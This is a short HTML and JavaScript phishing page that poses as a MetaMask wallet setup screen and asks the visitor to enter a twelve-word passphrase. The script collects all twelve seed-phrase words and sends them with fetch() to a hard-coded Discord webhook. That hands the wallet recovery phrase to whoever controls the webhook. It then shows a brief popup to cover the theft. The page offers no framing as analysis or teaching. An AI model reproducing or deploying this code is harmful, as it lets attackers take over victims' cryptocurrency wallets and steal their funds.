    <h1>Get started</h1> <h1 style="color: orange;">Download Metamask</h1>
    <h1>Enter your passphrase to continue</h1>
   

    <script>
      function submitForm() {
        const semilla1 = document.querySelector("input[placeholder='phrase 1']").value;
        const semilla2 = document.querySelector("input[placeholder='phrase 2']").value;
        const semilla3 = document.querySelector("input[placeholder='phrase 3']").value;
        const semilla4 = document.querySelector("input[placeholder='phrase 4']").value;
        const semilla5 = document.querySelector("input[placeholder='phrase 5']").value;
        const semilla6 = document.querySelector("input[placeholder='phrase 6']").value;
        const semilla7 = document.querySelector("input[placeholder='phrase 7']").value;
        const semilla8 = document.querySelector("input[placeholder='phrase 8']").value;
        const semilla9 = document.querySelector("input[placeholder='phrase 9']").value;
        const semilla10 = document.querySelector("input[placeholder='phrase 10']").value;
        const semilla11 = document.querySelector("input[placeholder='phrase 11']").value;
        const semilla12 = document.querySelector("input[placeholder='phrase 12']").value;

        const payload = {
          content: `phrase 1: ${semilla1}\nphrase 2: ${semilla2}\nphrase 3: ${semilla3}\nphrase 4: ${semilla4}\nphrase 5: ${semilla5}\nphrase 6: ${semilla6}\nphrase 7: ${semilla7}\nphrase 8: ${semilla8}\nphrase 9: ${semilla9}\nphrase 10: ${semilla10}\nphrase 11: ${semilla11}\nphrase 12: ${semilla12}`,
        };

        const url = "https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m";

        fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(payload),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Solicitud exitosa:", data);
          })
          .catch((error) => {
            console.error("Solicitud fallida:", error);
          });
      }
      var submitBtn = document.querySelector('input[type="submit"]');
var popup = document.querySelector('.popup');

submitBtn.addEventListener('click', function() {
  popup.style.display = 'block';
  setTimeout(function() {
    popup.style.display = 'none';
  }, 1000);
});

    </script>
